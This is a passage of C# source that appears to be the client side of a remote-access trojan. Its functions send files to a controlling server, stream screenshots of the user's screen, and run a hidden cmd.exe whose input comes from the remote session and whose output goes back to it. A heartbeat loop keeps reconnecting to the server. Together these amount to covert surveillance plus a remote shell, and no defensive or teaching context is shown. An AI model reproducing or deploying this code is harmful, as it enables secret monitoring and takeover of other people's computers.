                    data[i] = buffer[i];
                }
                session.Send(ePacketType.PACKET_START_DOWNLOAD_RESPONSE, data);
            }
            fs.Close();
            if (sessionDownloadHandleSwitch.ContainsKey(session.SocketId))
            {
                sessionDownloadHandleSwitch.Remove(session.SocketId);
            }
        }

        static void StartClientCaptureScreen(SocketSession session)
        {
            RequestStartGetScreen req = null;
            int sleepValue = 1000;
            int fpsValue = 1;
            while (true)
            {
                if (!sessionScreenHandleSwitch.ContainsKey(session.SocketId))
                {
                    return;
                }
                req = sessionScreenHandleSwitch[session.SocketId];
                fpsValue = req.fps;
                sleepValue = 1000 / fpsValue;
                for (int i = 0; i < fpsValue; i++)
                {
                    ResponseStartGetScreen resp = new ResponseStartGetScreen();
                    try
                    {
                        resp.SetImage(CaptureScreen(), ImageFormat.Jpeg);
                    }
                    catch (Exception ex)
                    {
                        resp.Result = false;
                        resp.Message = ex.Message;
                        resp.Detail = ex.StackTrace;
                    }
                    session.Send(ePacketType.PACKET_START_CAPTURE_SCREEN_RESPONSE, resp);
                    Thread.Sleep(sleepValue);
                }
            }
        }

        static void StartClientCmd(SocketSession session, RequestCommand req)
        {
            if(!sessionCmdHandleSwitch.ContainsKey(session.SocketId))
                sessionCmdHandleSwitch.Add(session.SocketId,null);
            if (sessionCmdHandleSwitch[session.SocketId] == null)
            {
                Process p = new Process();
                p.StartInfo.FileName = "cmd.exe";
                p.StartInfo.CreateNoWindow = true;
                p.StartInfo.UseShellExecute = false;
                p.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                p.StartInfo.RedirectStandardError = true;
                p.StartInfo.RedirectStandardInput = true;
                p.StartInfo.RedirectStandardOutput = true;
                p.OutputDataReceived += (o, args) =>
                {
                    ResponseCommand resp = new ResponseCommand();
                    resp.CommandResponse = args.Data;

                    session.Send(ePacketType.PACKET_COMMAND_RESPONSE, resp);

                    Console.WriteLine(session.SocketId + ":" + args.Data);
                };
                p.ErrorDataReceived += (o, args) =>
                {
                    ResponseCommand resp = new ResponseCommand();
                    resp.CommandResponse = args.Data;

                    session.Send(ePacketType.PACKET_COMMAND_RESPONSE, resp);
                };
                p.Start();

                p.BeginOutputReadLine();
                p.BeginErrorReadLine();

                sessionCmdHandleSwitch[session.SocketId] = p;
            }

            sessionCmdHandleSwitch[session.SocketId].StandardInput.WriteLine(req.Command);
            if (req.Command.Trim().ToLower() == "exit")
            {
                sessionCmdHandleSwitch[session.SocketId] = null;
            }
        }

        static void StartHeartbeat()
        {
            while (true)
            {
                if (isClosing)
                {
                    break;
                }
                try
                {
                    if (oServer != null)
                    {
                        byte[] packet = PacketFactory.EncodeOject(ePacketType.PACKET_HEART_BEAR, null);
                        oServer.Send(packet);
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine("心跳发送异常，" + ex.Message);
                    StartConnect();
                }
                Thread.Sleep(3000);
            }

        }

        static void StartMonitor()
        {
            while (true)
            {
                Thread.Sleep(1000);
            }
        }

        static void DoOutput(string sMsg)
        {
            Console.WriteLine("{0} {1}", DateTime.Now.ToString("yyyy/MM/dd HH:mm:ss"), sMsg);
        }

        static Image CaptureScreen()
        {
            Image myImage = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
            Graphics g = Graphics.FromImage(myImage);
            g.CopyFromScreen(new Point(0, 0), new Point(0, 0), new Size(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height));
            IntPtr pDC = g.GetHdc();
            g.ReleaseHdc(pDC);

            return myImage;
        }

        static void StartMessageBox(string title, string content, MessageBoxButtons buttons, MessageBoxIcon icon)
        {
            new Thread(() =>
                {
                    MessageBox.Show(content, title, buttons, icon);
                }) { IsBackground = true }.Start();
        }

        static void OnFireQuit(object sender, EventArgs e)
        {
            isClosing = true;
            if (heartbeatThread != null)
            {
                heartbeatThread.Join();
            }
            if (oServerSession != null)
            {
                oServerSession.Send(ePacketType.PACKET_CLIENT_CLOSE_RESPONSE, null);
            }
            Environment.Exit(0);
        }

    }
}
